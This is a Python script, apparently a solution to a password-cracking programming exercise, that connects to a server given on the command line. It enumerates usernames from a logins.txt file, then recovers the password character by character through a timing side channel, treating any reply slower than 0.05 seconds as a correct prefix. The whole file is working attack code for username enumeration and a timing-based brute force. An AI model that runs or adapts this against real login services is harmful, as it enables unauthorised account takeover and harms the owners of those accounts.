import sys
import string
import socket
import json
from datetime import datetime, timedelta

class PWHacker:

    def __init__(self, ip_adr, port):
        self.ip = ip_adr
        self.port = int(port)
        self.adr = (self.ip, self.port)


# def possible_cases(read_str, swapped):
#     for ii in range(0, 2 ** len(read_str)):
#         cap_mix_str = ''
#         for bit_cntr in range(0, len(read_str)):
#             bit_sift = (2 ** bit_cntr)
#             if (bit_sift & ii) == 0:
#                 cap_mix_str += read_str[bit_cntr]
#             else:
#                 cap_mix_str += swapped[bit_cntr]
#         yield cap_mix_str


def append_one(pw_so_far):
    global character_scope
    for single_char in character_scope:
        yield pw_so_far + single_char


def possible_char():
    char_scope = ''
    for single_char in string.ascii_lowercase:
        char_scope += single_char
    for single_char in string.ascii_uppercase:
        char_scope += single_char
    for single_char in string.digits:
        char_scope += single_char
    return char_scope


character_scope = possible_char()
f_logins = open('logins.txt', 'r', encoding='utf-8')
for_hack = PWHacker(sys.argv[1], sys.argv[2])
# for_hack = PWHacker('localhost', 9090)
socket = socket.socket()
socket.connect(for_hack.adr)
correct_login = False
pw_to_send = ' '
time_lapse_total = 0.0
login_cntr = 0
while not correct_login:
    login_read = f_logins.readline()
    if len(login_read) != 0:
        login_read = login_read.rstrip()
        login_obj = {'login': login_read, 'password': pw_to_send}
        login_json = json.dumps(login_obj)
        socket.send(login_json.encode('utf8'))
        response_json = socket.recv(1024).decode('utf8')
        response_dict = json.loads(response_json)
        response_2nd = response_dict['result']
        if response_2nd != 'Wrong login!':
            correct_login = True
            login_to_send = login_read
            break
f_logins.close()
pw_hacked = False
pw_to_send = ''  # start with an empty password
while (not pw_hacked) and (len(pw_to_send) <= 12):
    pw_trial = append_one(pw_to_send)
    for cntr in range(len(character_scope)):
        login_cntr += 1
        pw_to_send = next(pw_trial)
        login_obj = {'login': login_to_send, 'password': pw_to_send}
        login_json = json.dumps(login_obj, indent=4)
        before_send = datetime.now()
        socket.send(login_json.encode('utf-8'))
        pw_resp_json = socket.recv(1024).decode('utf-8')
        after_receive = datetime.now()
        this_delay = (after_receive - before_send).total_seconds()
        pw_resp_dict = json.loads(pw_resp_json)
        pw_resp_2nd = pw_resp_dict['result']
        if pw_resp_2nd == 'Connection success!':
            pw_hacked = True
            print(f'{login_json}')
            break
        elif this_delay > 0.05:  # first character found
            break
# print(f'# of trial: {login_cntr}. Ave time lapsed: {time_lapse_total / login_cntr}')
socket.close()
# print(f'outside - {login_json}')

